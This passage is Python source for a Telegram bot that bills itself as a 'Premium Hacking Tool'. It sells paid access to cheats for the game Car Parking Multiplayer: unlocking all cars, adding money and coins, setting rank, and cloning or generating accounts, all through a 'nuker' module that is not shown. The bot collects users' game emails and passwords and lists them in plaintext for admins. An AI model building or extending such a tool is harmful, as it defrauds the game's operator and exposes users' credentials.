                chat_id,
                get_text(chat_id, "subscription_expired"),
                reply_markup=markup,
                parse_mode='Markdown'
            )
            return
    if not check_subscription(chat_id):
        subscription_required(message)
        return
    if chat_id not in user_sessions or not user_sessions[chat_id].get('logged_in'):
        bot.send_message(chat_id, get_text(chat_id, "not_logged"), parse_mode='Markdown')
        return
    bot.send_message(chat_id, "🚘 **MARKMWEHEHETOOL BOT**\n🔥 Premium Hacking Tool 🔥\n━━━━━━━━━━━━━━━━━━━━━\n📱 **CPM1** - Advanced CPM1 activations\n🎮 **CPM2** - King Rank & Account Generation\n━━━━━━━━━━━━━━━━━━━━━\n💡 Choose the appropriate section below:", reply_markup=create_main_keyboard(chat_id), parse_mode='Markdown')

@bot.message_handler(commands=['cancel', 'back'])
def cancel_command(message):
    """Exit any waiting state (payment screenshot, form inputs, etc.)."""
    chat_id = message.chat.id
    if chat_id in user_states:
        del user_states[chat_id]
    bot.send_message(chat_id, "❌ **Cancelled.** Type /start to go back to the main menu.", parse_mode='Markdown')

@bot.message_handler(commands=['stars'])
def stars_balance_command(message):
    """Admin-only: view the bot's total received Stars (withdrawable at 1,000+ via Fragment)."""
    chat_id = message.chat.id
    if not is_admin(chat_id):
        bot.send_message(chat_id, get_text(chat_id, "not_admin"), parse_mode='Markdown')
        return
    data = _load_stars_balance()
    total = data.get("total_stars", 0)
    can_withdraw = total >= 1000
    text = (
        f"🌟 **BOT STARS BALANCE**\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"💰 **Total Stars Received:** {total:,} \u2b50\n\n"
    )
    if can_withdraw:
        text += f"✅ **You can NOW WITHDRAW!** (1,000+ Stars)\n"
        text += f"📌 Go to https://fragment.com/stars (log in with the bot's phone/account) and request withdrawal.\n\n"
    else:
        text += f"⏳ Need **1,000 Stars** to withdraw. {1000 - total:,} Stars to go.\n\n"
    recent = data.get("history", [])[-5:][::-1]
    if recent:
        text += f"📝 **Last 5 payments:**\n"
        for p in recent:
            text += (
                f"• @{p.get('username','?')} — {p.get('stars',0):,} \u2b50 ({p.get('duration','?').replace('_',' ').title()}) "
                f"[{p.get('payment_type','?')}]\n"
            )
    else:
        text += "📝 No Stars payments yet.\n"
    text += "━━━━━━━━━━━━━━━━━━━━━"
    bot.send_message(chat_id, text, parse_mode='Markdown')

@bot.message_handler(commands=['admin'])
def admin_command(message):
    chat_id = message.chat.id
    try:
        user = bot.get_chat(chat_id)
        username = user.username or "No username"
        first_name = user.first_name or "Unknown"
    except Exception:
        username = "Unknown"
        first_name = "Unknown"
    notify_admins(
        f"👑 **/admin command used**\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 Name: `{first_name}`\n"
        f"🆔 Username: @{username}\n"
        f"🆔 ID: `{chat_id}`\n"
        f"📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    if not is_admin(chat_id):
        bot.send_message(chat_id, get_text(chat_id, "not_admin"), parse_mode='Markdown')
        return
    markup = create_admin_keyboard(chat_id)
    bot.send_message(chat_id, get_text(chat_id, "admin_panel"), reply_markup=markup, parse_mode='Markdown')

# ═══════════════════════════════════════════════════════════
# 🎯 CALLBACK HANDLER
# ═══════════════════════════════════════════════════════════

# ═══════════════════════════════════════════════════════════
# 🌟 STARS BALANCE TRACKING (bot's received Stars)
# ═══════════════════════════════════════════════════════════

STARS_BALANCE_FILE = "stars_balance.json"

def _load_stars_balance():
    """Load the bot's total received Stars balance from local file."""
    try:
        if os.path.exists(STARS_BALANCE_FILE):
            with open(STARS_BALANCE_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
    except Exception as e:
        print(f"⚠️ Failed to load stars balance: {e}")
    return {"total_stars": 0, "history": []}

def _save_stars_balance(data):
    try:
        with open(STARS_BALANCE_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        print(f"⚠️ Failed to save stars balance: {e}")

def _add_stars_balance(user_id, username, first_name, stars, duration_key, payment_type="direct"):
    """Add received Stars to the bot's balance and persist it."""
    data = _load_stars_balance()
    data["total_stars"] = data.get("total_stars", 0) + stars
    data["history"].append({
        "user_id": user_id,
        "username": username,
        "first_name": first_name,
        "stars": stars,
        "duration": duration_key,
        "payment_type": payment_type,
        "timestamp": datetime.now(timezone.utc).isoformat()
    })
    if len(data["history"]) > 500:
        data["history"] = data["history"][-500:]
    _save_stars_balance(data)
    # Mirror to Firebase cloud
    try:
        db_put("bot/stars_balance", data)
    except Exception:
        pass
    return data["total_stars"]

def _activate_subscription(user_id, duration_hours, duration_key, first_name, username, payment_type="subscription"):
    """Shared subscription activation logic (used by Stars + money payments).

    Returns the time_key of the activated subscription.
    """
    time_key = create_time_key(duration_hours, user_id)
    if time_key in TIME_KEYS:
        TIME_KEYS[time_key]["used"] = True
        TIME_KEYS[time_key]["user_id"] = user_id
    USER_SUBSCRIPTIONS[user_id] = {
        "expires": TIME_KEYS[time_key]["expires"],
        "duration": duration_hours,
        "key": time_key
    }
    if time_key not in KEY_USAGE:
        KEY_USAGE[time_key] = []
        KEY_USERS_DETAILS[time_key] = {}
    if user_id not in KEY_USAGE[time_key]:
        KEY_USAGE[time_key].append(user_id)
        KEY_USAGE_COUNT[time_key] = len(KEY_USAGE[time_key])
    KEY_USERS_DETAILS[time_key][user_id] = {
        "username": username,
        "first_name": first_name,
        "used_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "type": payment_type
    }
    if user_id not in user_sessions:
        user_sessions[user_id] = {}
    user_sessions[user_id]['logged_in'] = True
    user_sessions[user_id]['is_time_key'] = True
    return time_key

def _send_stars_group_log(user_id, first_name, username, duration_key, stars, expires_str):
    """Post a record-only message to the group log for a Stars payment."""
    try:
        caption = (
            f"🌟 **STARS PAYMENT RECEIVED**\n━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 {first_name} (@{username})\n"
            f"🆔 ID: `{user_id}`\n"
            f"⏱️ Duration: {duration_key.replace('_', ' ').title()}\n"
            f"⭐ Stars: {stars}\n"
            f"📅 Expires: {expires_str}\n"
            f"✅ Status: AUTOMATICALLY ACTIVATED (no admin confirm needed)\n"
            f"━━━━━━━━━━━━━━━━━━━━━"
        )
        bot.send_message(
            GROUP_LOG_ID,
            caption,
            parse_mode='Markdown',
            reply_markup=create_subscription_stars_log_keyboard()
        )
    except Exception:
        pass

def _parse_sub_callback(rest):
    """Parse 'user_id_duration_payment' from a subscription callback rest string.

    Handles durations and payment methods that contain underscores (e.g. 1_day, gcash_to_paymaya)
    by validating against the known dictionaries instead of blind splitting.
    Returns (user_id, duration_key, payment_method) or (None, None, None) on failure.
    """
    try:
        user_id = int(rest.split("_", 1)[0])
        remainder = rest.split("_", 1)[1]
    except Exception:
        return None, None, None
    # Try all combinations of known duration keys + payment methods
    for dur in SUBSCRIPTION_DURATIONS:
        if remainder.startswith(dur + "_"):
            pm = remainder[len(dur) + 1:]
            if pm in PAYMENT_METHODS:
                return user_id, dur, pm
        if remainder == dur and dur in PAYMENT_METHODS:
            return user_id, dur, dur
    return None, None, None

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    chat_id = call.message.chat.id
    data = call.data

    if is_banned(chat_id):
        bot.answer_callback_query(call.id, "🚫 Banned!", show_alert=True)
        return

    # Actions that must never require channel subscription (e.g. group log
    # confirm/decline pressed by an admin in the logs group)
    _NO_SUB_REQUIRED = ["check_sub", "normal_key", "time_key", "free_trial", "subscription_menu", "logout", "back_main"]
    if data.startswith(("sub_confirm_", "sub_decline_", "stars_paid_", "sub_payment_")):
        pass  # admin/group actions; skip channel check
    elif data not in _NO_SUB_REQUIRED:
        if not check_subscription(chat_id):
            subscription_required(call.message)
            return

    try:
        bot.delete_message(chat_id, call.message.message_id)
    except Exception:
        pass

    # ====== Subscription ======
    if data == "check_sub":
        if check_subscription(chat_id):
            bot.send_message(chat_id, "✅ **Verified! You are subscribed**", parse_mode='Markdown')
            start(call.message)
        else:
            subscription_required(call.message)
        return

    # ====== Keys ======
    if data == "normal_key":
        bot.answer_callback_query(call.id, "🔑 Activating...")
        bot.send_message(chat_id, get_text(chat_id, "key_title"), parse_mode='Markdown')
        bot.register_next_step_handler(call.message, check_key)
        return

    if data == "time_key":
        bot.answer_callback_query(call.id, "⏰ Enter time key...")
        bot.send_message(chat_id, "⏰ **Enter your Time Key:**\n━━━━━━━━━━━━━━━━━━━━━\n📌 This key will give you access for a specific duration.", parse_mode='Markdown')
        bot.register_next_step_handler(call.message, check_time_key)
        return

    # ====== Free Trial ======
    if data == "free_trial":
        bot.answer_callback_query(call.id, "🎁 Activating free trial...")
        if not check_subscription(chat_id):
            bot.send_message(chat_id, "❌ **You must subscribe to the channel first!**", parse_mode='Markdown')
            return
        can_use, days_left, hours_left = can_use_free_trial(chat_id)
        if not can_use:
            bot.send_message(chat_id, f"❌ **You already used your free trial!**\n⏳ Available in {days_left} days and {hours_left} hours", parse_mode='Markdown')
            return
        trial_key = create_trial_key(chat_id, 10)
        if trial_key in TRIAL_KEYS:
            TRIAL_KEYS[trial_key]["used"] = True
            TRIAL_KEYS[trial_key]["user_id"] = chat_id
            TRIAL_KEYS[trial_key]["used_at"] = datetime.now()
        register_free_trial(chat_id)
        if trial_key not in KEY_USAGE:
            KEY_USAGE[trial_key] = []
            KEY_USERS_DETAILS[trial_key] = {}
        if chat_id not in KEY_USAGE[trial_key]:
            KEY_USAGE[trial_key].append(chat_id)
            KEY_USAGE_COUNT[trial_key] = len(KEY_USAGE[trial_key])
        try:
            user = bot.get_chat(chat_id)
            username = user.username or "No username"
            first_name = user.first_name or "Unknown"
        except Exception:
            username = "Unknown"
            first_name = "Unknown"
        KEY_USERS_DETAILS[trial_key][chat_id] = {
            "username": username,
            "first_name": first_name,
            "used_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "type": "trial"
        }
        if chat_id not in user_sessions:
            user_sessions[chat_id] = {}
        user_sessions[chat_id]['logged_in'] = True
        user_sessions[chat_id]['is_trial'] = True
        user_sessions[chat_id]['trial_key'] = trial_key
        notify_admins(
            f"🎁 **Free Trial Used**\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 Name: `{first_name}`\n"
            f"🆔 Username: @{username}\n"
            f"🆔 ID: `{chat_id}`\n"
            f"🔑 Key: `{trial_key}`\n"
            f"⏱️ Duration: 10 minutes\n"
            f"📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        add_log(chat_id, f"Free trial used: {trial_key}")
        bot.send_message(chat_id, "🎁 **Free trial activated!**\n⏱️ 10 minutes of full access\n✅ Enjoy!", parse_mode='Markdown')
        menu_command(call.message)
        return

    # ====== Sections ======
    if data == "section_cpm1":
        section_cpm1(call.message)
        return
    if data == "section_cpm2":
        section_cpm2(call.message)
        return
    if data == "back_main":
        menu_command(call.message)
        return

    # ====== CPM1 ======
    web_uid = get_web_uid(chat_id)
    
    if data == "refresh_account":
        if chat_id not in user_sessions or not user_sessions[chat_id].get('logged_in') or user_sessions[chat_id].get('version') != "1":
            bot.send_message(chat_id, "❌ **You must login to CPM1 first!**", parse_mode='Markdown')
            return
        loading_msg = bot.send_message(chat_id, "🔄 **Refreshing account data from server...**\n⏱️ Please wait...", parse_mode='Markdown')
        try:
            success, msg = refresh_account_data(chat_id)
            if success:
                bot.delete_message(chat_id, loading_msg.message_id)
                bot.send_message(chat_id, "✅ **Account data refreshed successfully!**", parse_mode='Markdown')
                show_cpm1_menu(chat_id, call.message, force_refresh=True)
            else:
                bot.edit_message_text(f"❌ **Failed to refresh account data!**\n💀 {msg}", chat_id, loading_msg.message_id, parse_mode='Markdown')
                show_cpm1_menu(chat_id, call.message)
        except Exception as e:
            bot.edit_message_text(f"❌ **Error refreshing data!**\n💀 {str(e)}", chat_id, loading_msg.message_id, parse_mode='Markdown')
            show_cpm1_menu(chat_id, call.message)
        return
    
    def execute_cpm1(feature_name, feature_func, *args):
        if chat_id not in user_sessions or not user_sessions[chat_id].get('logged_in') or user_sessions[chat_id].get('version') != "1":
            bot.send_message(chat_id, "❌ **You must login to CPM1 first!**", parse_mode='Markdown')
            section_cpm1(call.message)
            return
        bot.send_message(chat_id, f"⏳ **Executing {feature_name}...**", parse_mode='Markdown')
        result = run_async(feature_func(web_uid, *args))
        if result and result.get("ok"):
            bot.send_message(chat_id, f"✅ **{feature_name} completed successfully!**\n{result.get('message', '')}", parse_mode='Markdown')
            show_cpm1_menu(chat_id)
        else:
            bot.send_message(chat_id, f"❌ **{feature_name} failed!**\n{result.get('message', 'Unknown error')}", parse_mode='Markdown')
            show_cpm1_menu(chat_id)

    if data == "cpm1_change_email":
        bot.send_message(chat_id, "📧 **Enter new email:**", parse_mode='Markdown')
        user_states[chat_id] = {'awaiting_cpm1_email': True}
        return
    if data == "cpm1_change_pass":
        bot.send_message(chat_id, "🔑 **Enter new password (min 6 characters):**", parse_mode='Markdown')
        user_states[chat_id] = {'awaiting_cpm1_pass': True}
        return
    if data == "cpm1_clone":
        bot.send_message(chat_id, "📋 **Clone CPM1 Account**\n━━━━━━━━━━━━━━━━━━━━━\n📧 **Enter source account email:**", parse_mode='Markdown')
        user_states[chat_id] = {'awaiting_clone_source_email': True}
        return
    if data == "cpm1_unlock_cars":
        bot.send_message(chat_id, "🔐 **Login to CPM1**\n━━━━━━━━━━━━━━━━━━━━━\n📌 You must login first to access activations.\n━━━━━━━━━━━━━━━━━━━━━\n📧 **Enter CPM1 email:**", parse_mode='Markdown')
        user_cpm_version[chat_id] = "1"
        user_states[chat_id] = {'awaiting_unlock_email': True}
        return
    if data == "cpm1_w16":
        execute_cpm1("W16 Engine", nuker.unlock_w16)
        return
    if data == "cpm1_horns":
        execute_cpm1("Horns", nuker.unlock_horns)
        return
    if data == "cpm1_fuel":
        execute_cpm1("Unlimited Fuel", nuker.unlimited_fuel)
        return
    if data == "cpm1_damage":
        execute_cpm1("Disable Damage", nuker.disable_damage)
        return
    if data == "cpm1_smoke":
        execute_cpm1("Smoke", nuker.unlock_smoke)
        return
    if data == "cpm1_rank_advanced":
        execute_cpm1("Advanced King Rank", nuker.set_rank)
        return
    if data == "cpm1_fix":
        execute_cpm1("Fix Account", nuker.fix_account)
        return
    if data == "cpm1_change_id":
        bot.send_message(chat_id, "🆔 **Change ID**\n━━━━━━━━━━━━━━━━━━━━━\n📌 Send the new ID:", parse_mode='Markdown')
        user_states[chat_id] = {'awaiting_change_id': True}
        return
    if data == "cpm1_money":
        bot.send_message(chat_id, f"💰 **Add Money**\n━━━━━━━━━━━━━━━━━━━━━\n📌 Send amount (max {MAX_MONEY:,}):", parse_mode='Markdown')
        user_states[chat_id] = {'awaiting_money': True}
        return
    if data == "cpm1_coin":
        bot.send_message(chat_id, f"💎 **Add Coins**\n━━━━━━━━━━━━━━━━━━━━━\n📌 Send amount (max {MAX_COIN:,}):", parse_mode='Markdown')
        user_states[chat_id] = {'awaiting_coin': True}
        return
    if data == "cpm1_unlock_animations":
        execute_cpm1("Unlock Animations", nuker.unlock_animations)
        return
    if data == "cpm1_unlock_wheels":
        execute_cpm1("Unlock Wheels", nuker.unlock_wheels)
        return
    if data == "cpm1_unlock_houses":
        execute_cpm1("Unlock Houses", nuker.unlock_houses)
        return
    if data == "cpm1_complete_levels":
        execute_cpm1("Complete Levels", nuker.complete_all_levels)
        return
    if data == "cpm1_unlock_equip_male":
        execute_cpm1("Unlock Male Equipment", nuker.unlock_equipments_male)
        return
    if data == "cpm1_unlock_equip_female":
        execute_cpm1("Unlock Female Equipment", nuker.unlock_equipments_female)
        return
    if data == "cpm1_ultimate":
        execute_cpm1("Ultimate Unlock", nuker.unlock_all_features)
        return

    # ====== Unlock Cars Menu ======
    if data == "unlock_manual":
        if chat_id not in user_sessions or not user_sessions[chat_id].get('unlock_email') or not user_sessions[chat_id].get('unlock_pass'):
            bot.send_message(chat_id, "❌ **Missing data! Start from Unlock Cars again.**", parse_mode='Markdown')
            section_cpm1(call.message)
            return
        bot.send_message(chat_id, get_text(chat_id, "unlock_cars_manual_prompt"), parse_mode='Markdown')
        user_states[chat_id] = {'awaiting_unlock_manual_cid': True}
        return
    if data == "unlock_auto":
        if chat_id not in user_sessions or not user_sessions[chat_id].get('unlock_email') or not user_sessions[chat_id].get('unlock_pass'):
            bot.send_message(chat_id, "❌ **Missing data! Start from Unlock Cars again.**", parse_mode='Markdown')
            section_cpm1(call.message)
            return
        bot.send_message(chat_id, get_text(chat_id, "unlock_cars_auto_confirm"), reply_markup=create_unlock_auto_confirm_keyboard(chat_id), parse_mode='Markdown')
        return
    if data == "unlock_auto_confirm":
        email = user_sessions[chat_id].get('unlock_email')
        password = user_sessions[chat_id].get('unlock_pass')
        if not email or not password:
            bot.send_message(chat_id, "❌ **Missing data!**", parse_mode='Markdown')
            section_cpm1(call.message)
            return
        loading_msg = bot.send_message(chat_id, "⏳ **Unlocking ALL cars...**\n📦 Cloning from the official car vault (with vinyls!)\n⏱️ This may take 5-8 minutes\n📊 Progress will be shown below:", parse_mode='Markdown')
        def update_progress(current, total, success, fail):
            try:
                bot.edit_message_text(
                    f"⏳ **Unlocking cars...**\n"
                    f"━━━━━━━━━━━━━━━━━━━━━\n"
                    f"📊 Progress: {current}/{total}\n"
                    f"✅ Added: {success}\n"
                    f"❌ Skipped: {fail}\n"
                    f"━━━━━━━━━━━━━━━━━━━━━\n"
                    f"⏱️ Please wait...",
                    chat_id, loading_msg.message_id, parse_mode='Markdown'
                )
            except Exception:
                pass
        success, fail = cpm1_unlock_all_cars(email, password, update_progress)
        if success >= 200:
            result_text = f"🎉 **ALL CARS UNLOCKED!**\n━━━━━━━━━━━━━━━━━━━━━\n✅ Successfully added: {success} cars\n🎨 Vinyl designs included!\n💀 Skipped (already owned): {fail}\n━━━━━━━━━━━━━━━━━━━━━\n🚗 Open your garage in-game to see them!"
        elif success > 0:
            result_text = f"✅ **Cars unlocked!**\n━━━━━━━━━━━━━━━━━━━━━\n✅ Added: {success} cars\n🎨 Vinyl designs included!\n💀 Skipped: {fail}\n━━━━━━━━━━━━━━━━━━━━━\n🚗 Open your garage in-game!"
        else:
            result_text = f"❌ **Unlock failed.**\n━━━━━━━━━━━━━━━━━━━━━\n💀 Could not reach the car vault or your account.\n🔁 Please check your credentials and try again.\n━━━━━━━━━━━━━━━━━━━━━\n📊 Skipped: {fail}"
        bot.edit_message_text(
            result_text,
            chat_id, loading_msg.message_id, parse_mode='Markdown'
        )
        if 'unlock_email' in user_sessions[chat_id]:
            del user_sessions[chat_id]['unlock_email']
        if 'unlock_pass' in user_sessions[chat_id]:
            del user_sessions[chat_id]['unlock_pass']
        show_cpm1_menu(chat_id)
        return
    if data == "unlock_auto_cancel":
        bot.send_message(chat_id, "❌ **Auto injection cancelled.**", parse_mode='Markdown')
        if 'unlock_email' in user_sessions[chat_id]:
            del user_sessions[chat_id]['unlock_email']
        if 'unlock_pass' in user_sessions[chat_id]:
            del user_sessions[chat_id]['unlock_pass']
        show_cpm1_menu(chat_id)
        return

    # ====== CPM2 ======
    if data == "cpm2_king_rank":
        if not is_admin(chat_id):
            bot.send_message(chat_id, "🛠️ **CPM2 is currently under maintenance.**\n━━━━━━━━━━━━━━━━━━━━━\n⏳ Please check back later.\n\n📌 For inquiries, contact @Maarkryan.", parse_mode='Markdown')
            return
        if chat_id not in user_sessions or not user_sessions[chat_id].get('logged_in') or user_sessions[chat_id].get('version') != "2":
            bot.send_message(chat_id, "❌ **You must login to CPM2 first!**", parse_mode='Markdown')
            section_cpm2(call.message)
            return
        email = user_sessions[chat_id].get('email')
        password = user_sessions[chat_id].get('password')
        bot.send_message(chat_id, "⏳ **Upgrading rank...**", parse_mode='Markdown')
        success, msg = cpm2_king_rank(email, password)
        if success:
            bot.send_message(chat_id, f"✅ **{msg}**", parse_mode='Markdown')
        else:
            bot.send_message(chat_id, f"❌ **{msg}**", parse_mode='Markdown')
        return
    if data == "cpm2_generate":
        if not is_admin(chat_id):
            bot.send_message(chat_id, "🛠️ **CPM2 is currently under maintenance.**\n━━━━━━━━━━━━━━━━━━━━━\n⏳ Please check back later.\n\n📌 For inquiries, contact @Maarkryan.", parse_mode='Markdown')
            return
        if chat_id not in user_sessions or not user_sessions[chat_id].get('logged_in'):
            bot.send_message(chat_id, "❌ **You must login first!**", parse_mode='Markdown')
            section_cpm2(call.message)
            return
        bot.send_message(chat_id, "⏳ **Generating CPM2 account...**", parse_mode='Markdown')
        acc, err = generate_cpm2_account()
        if acc:
            bot.send_message(chat_id, f"✅ **Generated!**\n📧 `{acc['email']}`\n🔑 `{acc['password']}`", parse_mode='Markdown')
            save_account(chat_id, acc['email'], acc['password'], "cpm2_generated", "CPM2_Generated")
        else:
            bot.send_message(chat_id, "❌ **Generation failed!**", parse_mode='Markdown')
        return

    # ====== Logout ======
    if data == "logout":
        # FULL logout: clear login session AND saved credentials so the
        # user MUST login again — nothing stays saved after logging out.
        if chat_id in user_sessions:
            user_sessions[chat_id] = {}
        # Remove all saved login entries for this user (CPM1 & CPM2)
        if chat_id in saved_accounts:
            saved_accounts[chat_id] = []
        # Remove cached nuker data tied to this user as well
        try:
            web_uid = get_web_uid(chat_id)
            for ck_key in list(getattr(nuker, 'cache', {}).keys()):
                if ck_key.startswith(str(web_uid)):
                    del nuker.cache[ck_key]
        except Exception:
            pass
        bot.send_message(
            chat_id,
            "🚪 **LOGGED OUT SUCCESSFULLY**\n━━━━━━━━━━━━━━━━━━━━━\n🗑️ All saved logins cleared.\n🔐 You must login again to use the tools.\n━━━━━━━━━━━━━━━━━━━━━\n📱 Tap below to go back to the menu:",
            reply_markup=create_main_keyboard(chat_id),
            parse_mode='Markdown'
        )
        return

    # ====== Admin Panel ======
    if data == "admin_panel":
        if not is_admin(chat_id):
            bot.send_message(chat_id, get_text(chat_id, "not_admin"), parse_mode='Markdown')
            return
        bot.send_message(chat_id, get_text(chat_id, "admin_panel"), reply_markup=create_admin_keyboard(chat_id), parse_mode='Markdown')
        return

    # ====== Admin: Download Logs ======
    if data == "admin_download_logs":
        if not is_admin(chat_id):
            return
        download_logs_command(call.message)
        return
    if data == "admin_backup_now":
        if not is_admin(chat_id):
            return
        backup_now_command(call.message)
        return
    if data == "admin_dashboard":
        if not is_admin(chat_id):
            return
        dashboard_command(call.message)
        return

    # ====== Admin: Refresh All ======
    if data == "admin_refresh_all":
        if not is_admin(chat_id):
            return
        loading_msg = bot.send_message(chat_id, "🔄 **Refreshing all cached data...**\n⏱️ This may take a moment...", parse_mode='Markdown')
        count = 0
        for user_id in list(user_sessions.keys()):
            if user_sessions[user_id].get('logged_in') and user_sessions[user_id].get('version') == "1":
                web_uid = user_sessions[user_id].get('web_uid')
                email = user_sessions[user_id].get('email')
                if web_uid and email:
                    try:
                        ck = nuker._ck(web_uid, email)
                        if ck in nuker.cache:
                            del nuker.cache[ck]
                        count += 1
                    except Exception:
                        pass
        bot.edit_message_text(f"✅ **Refreshed {count} cached accounts!**", chat_id, loading_msg.message_id, parse_mode='Markdown')
        admin_panel(call.message)
        return

    # ====== Admin: Time Keys ======
    if data == "admin_time_keys":
        if not is_admin(chat_id):
            return
        markup = types.InlineKeyboardMarkup(row_width=2)
        btn1 = types.InlineKeyboardButton("➕ Create Time Key", callback_data="time_key_create")
        btn2 = types.InlineKeyboardButton("📊 List Keys", callback_data="time_key_list")
        btn3 = types.InlineKeyboardButton("🗑️ Delete Key", callback_data="time_key_delete")
        btn4 = types.InlineKeyboardButton("🔙 Back", callback_data="admin_panel")
        markup.row(btn1, btn2)
        markup.row(btn3)
        markup.row(btn4)
        bot.send_message(chat_id, "⏰ **Manage Time Keys**\n━━━━━━━━━━━━━━━━━━━━━\n📌 Choose an action:", reply_markup=markup, parse_mode='Markdown')
        return
    if data == "time_key_create":
        if not is_admin(chat_id):
            return
        bot.send_message(chat_id, "⏰ **Create Time Key**\n━━━━━━━━━━━━━━━━━━━━━\n📌 Enter duration in hours (e.g., 1, 12, 24, 48):", parse_mode='Markdown')
        user_states[chat_id] = {'awaiting_time_key_hours': True}
        return
    if data == "time_key_list":
        if not is_admin(chat_id):
            return
        if not TIME_KEYS:
            bot.send_message(chat_id, "📭 **No time keys**", parse_mode='Markdown')
            admin_panel(call.message)
            return
        text = "⏰ **Time Keys List**\n━━━━━━━━━━━━━━━━━━━━━\n\n"
        for key, data in TIME_KEYS.items():
            status = "❌ Expired" if datetime.now() > data["expires"] else "⏳ Valid"
            if data["used"]:
                status = "✅ Used"
            remaining = (data["expires"] - datetime.now()).total_seconds() / 3600
            text += f"🔑 `{key}`\n"
            text += f"   ⏱️ {data['duration']} hours\n"
            text += f"   📊 {status}\n"
            if data["user_id"]:
                text += f"   👤 User: `{data['user_id']}`\n"
                if datetime.now() <= data["expires"] and data["user_id"]:
                    text += f"   ✅ Still valid for this user\n"
            text += f"   ─────────────────────\n"
        bot.send_message(chat_id, text, parse_mode='Markdown')
        admin_panel(call.message)
        return
    if data == "time_key_delete":
        if not is_admin(chat_id):
            return
        bot.send_message(chat_id, "🗑️ **Delete Time Key**\n━━━━━━━━━━━━━━━━━━━━━\n📌 Send the key to delete:", parse_mode='Markdown')
        user_states[chat_id] = {'awaiting_time_key_delete': True}
        return

    # ====== Admin: Key Stats ======
    if data == "admin_key_stats":
        if not is_admin(chat_id):
            return
        stats_text = "📊 **Key Statistics**\n━━━━━━━━━━━━━━━━━━━━━\n\n"
        stats_text += "🔑 **Normal Keys:**\n"
        if ALLOWED_KEYS:
            for key in ALLOWED_KEYS:
                count = KEY_USAGE_COUNT.get(key, 0)
                stats_text += f"  • `{key}` → {count} users\n"
        else:
            stats_text += "  📭 No keys\n"
        stats_text += "\n⏰ **Time Keys:**\n"
        if TIME_KEYS:
            for key, data in TIME_KEYS.items():
                status = "✅ Used" if data["used"] else "⏳ Valid"
                if datetime.now() > data["expires"]:
                    status = "❌ Expired"
                count = KEY_USAGE_COUNT.get(key, 0)
                stats_text += f"  • `{key}` → {status} ({count} users)\n"
        else:
            stats_text += "  📭 No time keys\n"
        stats_text += "\n🎁 **Trial Keys:**\n"
        if TRIAL_KEYS:
            for key, data in TRIAL_KEYS.items():
                status = "✅ Used" if data["used"] else "⏳ Valid"
                if datetime.now() > data["expires"]:
                    status = "❌ Expired"
                count = KEY_USAGE_COUNT.get(key, 0)
                stats_text += f"  • `{key}` → {status} ({count} users)\n"
        else:
            stats_text += "  📭 No trial keys\n"
        stats_text += f"\n━━━━━━━━━━━━━━━━━━━━━\n📊 Total key users: {len(KEY_USAGE)}"
        bot.send_message(chat_id, stats_text, parse_mode='Markdown')
        admin_panel(call.message)
        return

    # ====== Admin: Key Users ======
    if data == "admin_key_users":
        if not is_admin(chat_id):
            return
        markup = types.InlineKeyboardMarkup(row_width=1)
        for key in ALLOWED_KEYS:
            count = KEY_USAGE_COUNT.get(key, 0)
            markup.add(types.InlineKeyboardButton(f"🔑 {key} ({count} users)", callback_data=f"show_key_users_{key}"))
        for key in TIME_KEYS.keys():
            count = KEY_USAGE_COUNT.get(key, 0)
            markup.add(types.InlineKeyboardButton(f"⏰ {key} ({count} users)", callback_data=f"show_key_users_{key}"))
        for key in TRIAL_KEYS.keys():
            count = KEY_USAGE_COUNT.get(key, 0)
            markup.add(types.InlineKeyboardButton(f"🎁 {key} ({count} users)", callback_data=f"show_key_users_{key}"))
        btn_back = types.InlineKeyboardButton("🔙 Back", callback_data="admin_panel")
        markup.add(btn_back)
        bot.send_message(chat_id, "🔑 **Select a key to view users:**", reply_markup=markup, parse_mode='Markdown')
        return
    if data.startswith("show_key_users_"):
        if not is_admin(chat_id):
            return
        key = data.replace("show_key_users_", "")
        users = KEY_USERS_DETAILS.get(key, {})
        if not users:
            bot.send_message(chat_id, f"📭 **No users for key `{key}`**", parse_mode='Markdown')
            admin_panel(call.message)
            return
        text = f"👥 **Users of key `{key}`**\n━━━━━━━━━━━━━━━━━━━━━\n"
        text += f"📊 Total: {len(users)} users\n\n"
        user_list = []
        for idx, (user_id, details) in enumerate(users.items(), 1):
            user_list.append(f"**{idx}.** 👤 {details['first_name']}\n   🆔 @{details['username']}\n   🆔 ID: `{user_id}`\n   📅 {details['used_at']}\n   ─────────────────────")
        if user_list:
            for i in range(0, len(user_list), 15):
                batch = "\n".join(user_list[i:i+15])
                bot.send_message(chat_id, text + batch, parse_mode='Markdown')
                text = ""
        admin_panel(call.message)
        return

    # ====== Admin: Stats ======
    if data == "admin_stats":
        if not is_admin(chat_id):
            return
        stats_text = f"📊 **General Statistics**\n━━━━━━━━━━━━━━━━━━━━━\n👥 Users: {len(total_users)}\n🟢 Sessions: {len([u for u in user_sessions if user_sessions[u].get('logged_in')])}\n🔑 Normal Keys: {len(ALLOWED_KEYS)}\n⏰ Time Keys: {len(TIME_KEYS)}\n🎁 Trial Keys: {len(TRIAL_KEYS)}\n🚫 Banned: {len(banned_users)}\n💾 Saved Accounts: {sum(len(accs) for accs in saved_accounts.values())}"
        bot.send_message(chat_id, stats_text, parse_mode='Markdown')
        admin_panel(call.message)
        return
    if data == "admin_saved":
        if not is_admin(chat_id):
            return
        if not saved_accounts:
            bot.send_message(chat_id, "💾 **No saved accounts**", parse_mode='Markdown')
        else:
            text = ""
            count = 0
            for uid, accs in saved_accounts.items():
                for acc in accs:
                    count += 1
                    text += f"**{count}.** 🆔 `{uid}`\n   📧 {acc.get('email')}\n   🔑 {acc.get('password')}\n   📅 {acc.get('saved_at')}\n   ──────────────────\n"
                    if count >= 20:
                        break
                if count >= 20:
                    break
            bot.send_message(chat_id, f"💾 **Saved Accounts**\n\n{text}", parse_mode='Markdown')
        admin_panel(call.message)
        return
    if data == "admin_status":
        if not is_admin(chat_id):
            return
        global bot_status
        bot_status = not bot_status
